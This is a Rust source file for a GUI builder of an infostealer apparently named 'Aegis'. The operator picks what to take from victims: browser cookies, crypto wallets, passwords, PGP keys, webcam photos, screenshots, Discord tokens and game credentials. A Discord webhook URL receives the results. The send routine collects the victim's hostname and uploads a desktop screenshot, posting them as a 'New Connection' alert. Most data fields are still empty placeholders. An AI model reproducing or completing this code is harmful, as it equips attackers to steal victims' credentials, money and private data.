use iced::{
    Element, application,
    wgpu::naga::valid::Uniformity,
    widget::{button, checkbox, column, container, row, text, text_input},
};
use tokio::runtime::{Builder, Runtime};

use crate::utils::webhook::EmbedFooter;
use crate::utils::webhook::EmbedThumbnail;
use crate::utils::webhook::WebhookField;
use crate::utils::{grab, webhook::Embed};

mod utils;

#[derive(Default, Debug, Clone)]
struct App {
    webhook_uri: Option<String>,
    browser_cookies: bool,
    crypto_wallets: bool,
    txt_files: bool,
    passwords: bool,
    pgp_keys: bool,
    webcam_photo: bool,
    screenshot_desktop: bool,
    discord_token: bool,
    minecraft_ssid: bool,
    growtopia_save_dat: bool,
}

#[derive(Debug, Clone)]
enum Message {
    ChangeWebhookUri(String),
    ToggleBrowserCookies(bool),
    ToggleCryptoWallets(bool),
    ToggleTxtFiles(bool),
    TogglePasswords(bool),
    TogglePgpKeys(bool),
    ToggleWebcamPhoto(bool),
    ToggleScreenshotDesktop(bool),
    ToggleDiscordToken(bool),
    ToggleMinecraftSsid(bool),
    ToggleGrowtopiaSaveDat(bool),
    SendWebhook,
}

impl App {
    fn update(&mut self, message: Message) {
        match message {
            Message::ChangeWebhookUri(uri) => {
                self.webhook_uri = Some(uri);
            }
            Message::ToggleBrowserCookies(toggle) => {
                self.browser_cookies = toggle;
            }
            Message::ToggleCryptoWallets(toggle) => {
                self.crypto_wallets = toggle;
            }
            Message::ToggleTxtFiles(toggle) => {
                self.txt_files = toggle;
            }
            Message::TogglePasswords(toggle) => {
                self.passwords = toggle;
            }
            Message::TogglePgpKeys(toggle) => {
                self.pgp_keys = toggle;
            }
            Message::ToggleWebcamPhoto(toggle) => {
                self.webcam_photo = toggle;
            }
            Message::ToggleScreenshotDesktop(toggle) => {
                self.screenshot_desktop = toggle;
            }
            Message::ToggleDiscordToken(toggle) => {
                self.discord_token = toggle;
            }
            Message::ToggleMinecraftSsid(toggle) => {
                self.minecraft_ssid = toggle;
            }
            Message::ToggleGrowtopiaSaveDat(toggle) => {
                self.growtopia_save_dat = toggle;
            }
            Message::SendWebhook => {
                if let Some(uri) = &self.webhook_uri {
                    let rt = Builder::new_current_thread().enable_all().build().unwrap();

                    rt.block_on(async {

                        let embeds = [ Embed {
                            title: "New Connection!".to_string(),
                            description: "A new person has ran Aegis. Enjoy!".to_string(),
                            footer: EmbedFooter {
                                text: "by @shoegazers (Rivers Frost) on GitHub! https://github.com/shoegazers/Aegis".to_string(),
                            },
                            thumbnail: EmbedThumbnail {
                                url: "https://cdn.discordapp.com/attachments/1502671248914780172/1502675954298912939/ebdc35ac12f72951ef450f3e50c685af.png?ex=6a009389&is=69ff4209&hm=85982e6905ed1242a9d5679807c5f94fdd1b711ea63f8c111863444a6c6920f2&".to_string(),
                            },
                            fields: [
                                WebhookField {
                                    name: "Device Information".to_string(),
                                    value: format!("Hostname: {:?}", grab::get_host()),
                                    inline: false,
                                },
                                WebhookField {
                                    name: "Browser Cookies".to_string(),
                                    value: "".to_string(),
                                    inline: false,
                                },
                                WebhookField {
                                    name: "Crypto Wallets".to_string(),
                                    value: "".to_string(),
                                    inline: false,
                                },
                                WebhookField {
                                    name: "Text Files".to_string(),
                                    value: "".to_string(),
                                    inline: false,
                                },
                                WebhookField {
                                    name: "Passwords".to_string(),
                                    value: "".to_string(),
                                    inline: false,
                                },
                                WebhookField {
                                    name: "PGP Keys".to_string(),
                                    value: "".to_string(),
                                    inline: false,
                                },
                                WebhookField {
                                    name: "Webcam Photo".to_string(),
                                    value: "".to_string(),
                                    inline: false,
                                },
                                WebhookField {
                                    name: "Screenshot Desktop".to_string(),
                                    value: format!("{:?}", grab::screenshot_desktop_and_upload().await.unwrap().join(", ")),
                                    inline: false,
                                },
                                WebhookField {
                                    name: "Discord Token".to_string(),
                                    value: "".to_string(),
                                    inline: false,
                                },
                                WebhookField {
                                    name: "Minecraft SSID".to_string(),
                                    value: "".to_string(),
                                    inline: false,
                                },
                                WebhookField {
                                    name: "Growtopia Save Dat".to_string(),
                                    value: "".to_string(),
                                    inline: false,
                                },
                            ].to_vec(),
                        }];

                        let hook = utils::webhook::WebhookPayload {
                            username: "Aegis".to_string(),
                            avatar_url: "https://cdn.discordapp.com/attachments/1502671248914780172/1502675954298912939/ebdc35ac12f72951ef450f3e50c685af.png?ex=6a009389&is=69ff4209&hm=85982e6905ed1242a9d5679807c5f94fdd1b711ea63f8c111863444a6c6920f2&".to_string(),
                            content: "New Connection Established!".to_string(),
                            embeds: embeds.to_vec(),
                        };

                        utils::webhook::send(uri, &hook).await;
                    })
                }
            }
        }
    }

    fn view(&self) -> Element<Message> {
        let row = row![
            column![
                checkbox(self.browser_cookies)
                    .label("Browser Cookies")
                    .on_toggle(Message::ToggleBrowserCookies),
                checkbox(self.crypto_wallets)
                    .label("Crypto Wallets")
                    .on_toggle(Message::ToggleCryptoWallets),
                checkbox(self.txt_files)
                    .label("Txt Files")
                    .on_toggle(Message::ToggleTxtFiles),
                checkbox(self.passwords)
                    .label("Passwords")
                    .on_toggle(Message::TogglePasswords),
            ],
            column![
                checkbox(self.pgp_keys)
                    .label("Pgp Keys")
                    .on_toggle(Message::TogglePgpKeys),
                checkbox(self.webcam_photo)
                    .label("Webcam Photo")
                    .on_toggle(Message::ToggleWebcamPhoto),
                checkbox(self.screenshot_desktop)
                    .label("Screenshot Desktop")
                    .on_toggle(Message::ToggleScreenshotDesktop),
                checkbox(self.discord_token)
                    .label("Discord Token")
                    .on_toggle(Message::ToggleDiscordToken),
            ],
            checkbox(self.minecraft_ssid)
                .label("Minecraft Ssid")
                .on_toggle(Message::ToggleMinecraftSsid),
            checkbox(self.growtopia_save_dat)
                .label("Growtopia Save Dat")
                .on_toggle(Message::ToggleGrowtopiaSaveDat),
            text_input(
                "Discord Webhook URL",
                self.webhook_uri.as_deref().unwrap_or("")
            )
            .on_input(Message::ChangeWebhookUri),
            button("Test Hook").on_press(Message::SendWebhook)
        ]
        .padding(20.0);

        container(row).into()
    }
}

fn main() -> iced::Result {
    application(|| App::default(), App::update, App::view).run()
}
